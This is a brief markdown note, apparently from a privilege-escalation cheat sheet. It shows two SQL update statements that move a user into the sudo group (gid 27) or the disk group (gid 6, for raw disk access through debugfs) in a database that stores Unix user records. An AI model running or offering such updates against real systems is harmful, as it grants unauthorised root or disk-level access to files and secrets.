## USE CASE:

### If your current user is allowed to set UID and/or GID on a aspecific user in a database you can do:

#### 1) update TABLE set gid=27 where uid=USER_UID (Sets the user to sudo group (sudo -s))

#### 2) update TABLE set gid=6 where uid=USER_UID (Sets the user to disk group (debugfs))
